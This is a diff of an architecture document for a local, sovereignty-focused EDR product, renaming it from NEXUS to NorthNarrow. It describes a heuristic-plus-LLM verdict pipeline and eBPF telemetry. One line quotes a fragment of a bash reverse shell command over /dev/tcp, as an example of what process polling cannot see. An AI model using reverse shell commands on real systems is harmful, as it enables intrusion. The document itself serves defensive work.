@@ -1,13 +1,13 @@
-# NEXUS AIEDR — Architecture Deep Dive
+# NorthNarrow — Architecture Deep Dive
 
-This document explains the architectural decisions behind NEXUS AIEDR
+This document explains the architectural decisions behind NorthNarrow
 and the reasoning that led to its current design.
 
 ---
 
 ## Design Principles
 
-NEXUS is built around three non-negotiable principles:
+NorthNarrow is built around three non-negotiable principles:
 
 1. **Sovereignty first** — no telemetry leaves the protected perimeter
 2. **Determinism + intelligence** — combine sub-millisecond rules with
@@ -19,7 +19,7 @@ NEXUS is built around three non-negotiable principles:
 
 ## The Cascading Oracle
 
-The most distinctive architectural choice in NEXUS is the **Cascading
+The most distinctive architectural choice in NorthNarrow is the **Cascading
 Oracle**: a two-stage verdict pipeline that combines deterministic
 heuristics with local LLM reasoning.
 
@@ -30,7 +30,7 @@ Modern EDR products typically choose one path:
 - **Pure ML**: handles novelty but black-box, hard to audit
 - **Cloud ML**: best detection quality but breaks data sovereignty
 
-NEXUS chose a **hybrid local approach**: heuristic rules handle the
+NorthNarrow chose a **hybrid local approach**: heuristic rules handle the
 known patterns at sub-millisecond latency, and the LLM handles the
 ambiguous cases that fall in the middle.
 
@@ -66,7 +66,7 @@ which considers the process tree, parent, working directory, and
 returns enriched context.
 
 **Graceful degradation**: if the LLM server is unreachable, the
-HeuristicOracle continues alone. NEXUS never goes "blind".
+HeuristicOracle continues alone. NorthNarrow never goes "blind".
 
 ---
 
@@ -78,7 +78,7 @@ Darktrace, and similar products.
 
 ### Trade-offs we accepted
 
-| Aspect | Cloud LLM | Local LLM (NEXUS) |
+| Aspect | Cloud LLM | Local LLM (NorthNarrow) |
 |--------|-----------|-------------------|
 | Latency | 200ms–2s | 7–15s on CPU |
 | Quality | GPT-4 class | Gemma 4 (smaller) |
@@ -89,7 +89,7 @@ Darktrace, and similar products.
 
 For environments where **sovereignty is non-negotiable** (banking,
 defense, healthcare, regulated EU markets), the latency trade-off
-is acceptable. For environments where it isn't, NEXUS isn't the
+is acceptable. For environments where it isn't, NorthNarrow isn't the
 right tool — and that's fine.
 
 ### Why Gemma 4 E4B specifically
@@ -110,7 +110,7 @@ abstract enough (`Oracle` trait) that swapping models is a config change.
 
 ## Tier-Aware Knowledge Base
 
-Inspired by GitLab and Elastic, NEXUS uses a single binary with
+Inspired by GitLab and Elastic, NorthNarrow uses a single binary with
 feature-flagged commercial tiers.
 
 ### How it works
@@ -186,7 +186,7 @@ With those proven, we can now invest in eBPF without architectural risk.
   >& /dev/tcp/host/port 0>&1` doesn't show the redirection
 
 These limitations are **fundamental to userspace polling**, not a
-NEXUS-specific bug.
+NorthNarrow-specific bug.
 
 ### Milestone 10: eBPF kernel telemetry
 
@@ -198,17 +198,18 @@ level **before** exec replaces the process image. This captures:
 - Sub-millisecond detection latency
 - Syscall-level visibility (`connect`, `openat`, `clone`, `ptrace`)
 
-This brings NEXUS in line with industry-standard EDR tools (Falco,
+This brings NorthNarrow in line with industry-standard EDR tools (Falco,
 CrowdStrike Falcon Linux sensor, Sysdig Secure) which all use eBPF.
 
 ---
 
-## Future: nexus-hive P2P Mesh (Milestone 11)
+## Future: P2P Mesh for Multi-Host Coordination
 
-The current design is **per-host**. NEXUS agents on different machines
+The current design is **per-host**. NorthNarrow agents on different machines
 operate independently, with no inter-agent communication.
 
-The planned `nexus-hive` mesh enables:
+A P2P mesh layer is planned (no crate allocated yet — design will start when
+concrete requirements from a deployment partner emerge):
 
 - **mDNS peer discovery** on the local network (no central server)
 - **Ed25519-signed beacons** for IoC propagation between peers
@@ -216,18 +217,17 @@ The planned `nexus-hive` mesh enables:
   peers have validated it
 - **Air-gapped P2P**: works on isolated networks without internet
 
-This will be the **unique commercial differentiator** vs Wazuh/Falco,
-which require central management servers (and therefore breach
-air-gapped requirements).
+This is the **commercial differentiator** vs Wazuh/Falco, which require
+central management servers (and therefore breach air-gapped requirements).
 
 ---
 
-## What NEXUS Deliberately Doesn't Do
+## What NorthNarrow Deliberately Doesn't Do
 
-To stay focused, NEXUS explicitly declines several common EDR features:
+To stay focused, NorthNarrow explicitly declines several common EDR features:
 
 - ❌ **Cloud telemetry aggregation** — all analysis stays local
-- ❌ **External threat feeds** — KB is signed by NEXUS team only (M12)
+- ❌ **External threat feeds** — KB is signed by NorthNarrow team only (M12)
 - ❌ **Auto-update from internet** — air-gapped operation requires
   manual KB updates via signed feed files
 - ❌ **macOS support** (for now) — small market, requires Apple ESF
